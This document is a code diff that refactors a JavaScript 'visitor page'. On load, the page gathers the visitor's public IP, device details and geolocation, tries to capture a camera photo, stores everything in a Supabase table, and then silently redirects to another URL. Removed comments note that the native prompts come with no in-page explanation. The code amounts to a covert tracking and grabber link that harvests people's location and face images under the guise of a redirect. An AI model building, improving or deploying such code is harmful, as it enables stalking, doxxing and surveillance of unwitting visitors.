@@ -10,13 +10,13 @@ function cfg() {
   return window.APP_CONFIG || {};
 }
 
-async function saveVisit(payload) {
+function saveVisit(payload) {
   const { supabaseUrl, supabaseAnonKey } = cfg();
   if (!isSupabaseConfigured()) {
-    return { ok: false, local: true };
+    return Promise.resolve({ ok: false, local: true });
   }
 
-  const res = await fetch(`${supabaseUrl}/rest/v1/visits`, {
+  return fetch(`${supabaseUrl}/rest/v1/visits`, {
     method: "POST",
     headers: {
       apikey: supabaseAnonKey,
@@ -25,37 +25,27 @@ async function saveVisit(payload) {
       Prefer: "return=minimal",
     },
     body: JSON.stringify(payload),
+  }).then((res) => {
+    if (!res.ok) throw new Error(String(res.status));
+    return { ok: true };
   });
-
-  if (!res.ok) {
-    const text = await res.text();
-    throw new Error(text || `HTTP ${res.status}`);
-  }
-  return { ok: true };
 }
 
 export function initVisitorPage() {
-  const videoEl = document.getElementById("preview");
-
   async function run() {
-    const redirectTarget = await fetchRedirectUrl();
+    const redirectPromise = fetchRedirectUrl();
+    const ipPromise = fetchPublicIp().catch(() => ({ ip: null, source: null }));
+    const locationPromise = requestLocation();
 
-    const deviceInfo = getDeviceInfo();
+    const [redirectTarget, ipPayload, locationPayload] = await Promise.all([
+      redirectPromise,
+      ipPromise,
+      locationPromise,
+    ]);
 
-    let ipPayload = { ip: null, source: null };
-    try {
-      ipPayload = await fetchPublicIp();
-    } catch {
-      /* continue */
-    }
-
-    // Native OS/browser location prompt (no in-page UI)
-    const locationPayload = await requestLocation();
-
-    // Native camera prompt (no in-page UI)
     let photoPayload = { granted: false, dataUrl: null };
     try {
-      photoPayload = await captureSelfie(videoEl);
+      photoPayload = await captureSelfie();
     } catch {
       photoPayload = { granted: false, error: "denied_or_unavailable" };
     }
@@ -63,7 +53,7 @@ export function initVisitorPage() {
     const payload = {
       ip: ipPayload.ip,
       ip_source: ipPayload.source,
-      device_info: deviceInfo,
+      device_info: getDeviceInfo(),
       location_granted: locationPayload.granted,
       location: locationPayload.granted
         ? {
@@ -83,7 +73,6 @@ export function initVisitorPage() {
     } catch {
       /* still redirect */
     }
-
     window.location.replace(redirectTarget);
   }
 
